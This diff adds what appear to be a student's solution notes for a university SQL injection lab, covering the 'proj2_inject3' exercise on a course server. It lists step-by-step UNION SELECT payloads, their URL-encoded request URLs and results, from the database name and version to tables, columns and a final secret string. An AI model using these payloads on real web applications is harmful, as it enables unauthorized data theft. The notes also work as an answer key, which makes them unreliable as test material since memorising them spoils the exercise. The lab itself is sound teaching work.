@@ -1,0 +1,44 @@
+Find db_name:
+
+' UNION SELECT '1', DATABASE(), '3', '4' -- 
+http://bungle.cs.virginia.edu/sqlinject3/?id=%27+UNION+SELECT+%271%27%2C+DATABASE%28%29%2C+%273%27%2C+%274%27+--+
+proj2_inject3
+
+Find MySQL version:
+' UNION SELECT '1', @@VERSION, '3', '4' -- 
+http://bungle.cs.virginia.edu/sqlinject3/?id=%27+UNION+SELECT+%271%27%2C+%40%40VERSION%2C+%273%27%2C+%274%27+--+
+8.0.31-0ubuntu0.22.04.1
+
+List the tables in the current database from #1 as a comma-separated list:
+' UNION SELECT '1', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'proj2_inject3'), '3', '4' -- 
+http://bungle.cs.virginia.edu/sqlinject3/?id=%27+UNION+SELECT+%271%27%2C+%28SELECT+GROUP_CONCAT%28table_name%29+FROM+information_schema.tables+WHERE+table_type%3D%27BASE+TABLE%27+AND+table_schema+%3D+%27proj2_inject3%27%29%2C+%273%27%2C+%274%27+--+
+HINT,SECRET,foo,inject3_users
+
+Follow the hint in the answer to #3 to find your secret string. Do not submit your partner's:
+
+Get the columns for HINT:
+' UNION SELECT '1', (SELECT GROUP_CONCAT(`COLUMN_NAME`) FROM `INFORMATION_SCHEMA`.`COLUMNS` WHERE `TABLE_SCHEMA`='proj2_inject3' AND `TABLE_NAME`='HINT'), '3', '4' -- 
+http://bungle.cs.virginia.edu/sqlinject3/?id=%27+UNION+SELECT+%271%27%2C+%28SELECT+GROUP_CONCAT%28%60COLUMN_NAME%60%29+FROM+%60INFORMATION_SCHEMA%60.%60COLUMNS%60+WHERE+%60TABLE_SCHEMA%60%3D%27proj2_inject3%27+AND+%60TABLE_NAME%60%3D%27HINT%27%29%2C+%273%27%2C+%274%27+--+
+id,message
+
+Get id values for HINT:
+' UNION SELECT '1', (SELECT GROUP_CONCAT(id) FROM HINT), '3', '4' -- 
+http://bungle.cs.virginia.edu/sqlinject3/?id=%27+UNION+SELECT+%271%27%2C+%28SELECT+GROUP_CONCAT%28id%29+FROM+HINT%29%2C+%273%27%2C+%274%27+--+
+1
+
+Get message values for HINT:
+' UNION SELECT '1', (SELECT GROUP_CONCAT(message) FROM HINT), '3', '4' -- 
+http://bungle.cs.virginia.edu/sqlinject3/?id=%27+UNION+SELECT+%271%27%2C+%28SELECT+GROUP_CONCAT%28message%29+FROM+HINT%29%2C+%273%27%2C+%274%27+--+
+go to table SECRET and get a secret string from row with your md5(netid)
+
+Get the columns for SECRET:
+' UNION SELECT '1', (SELECT GROUP_CONCAT(`COLUMN_NAME`) FROM `INFORMATION_SCHEMA`.`COLUMNS` WHERE `TABLE_SCHEMA`='proj2_inject3' AND `TABLE_NAME`='SECRET'), '3', '4' -- 
+http://bungle.cs.virginia.edu/sqlinject3/?id=%27+UNION+SELECT+%271%27%2C+%28SELECT+GROUP_CONCAT%28%60COLUMN_NAME%60%29+FROM+%60INFORMATION_SCHEMA%60.%60COLUMNS%60+WHERE+%60TABLE_SCHEMA%60%3D%27proj2_inject3%27+AND+%60TABLE_NAME%60%3D%27SECRET%27%29%2C+%273%27%2C+%274%27+--+
+id,hash,secret
+
+NOT A QUERY -- md5 hash of netid (crh3mn): 6a3415f2154ba514d53fc2d0bfef88cf
+
+GET secret value for the above hash:
+' UNION SELECT '1', (SELECT secret FROM SECRET WHERE hash = '6a3415f2154ba514d53fc2d0bfef88cf'), '3', '4' -- 
+http://bungle.cs.virginia.edu/sqlinject3/?id=%27+UNION+SELECT+%271%27%2C+%28SELECT+secret+FROM+SECRET+WHERE+hash+%3D+%276a3415f2154ba514d53fc2d0bfef88cf%27%29%2C+%273%27%2C+%274%27+--+
+triquetrum
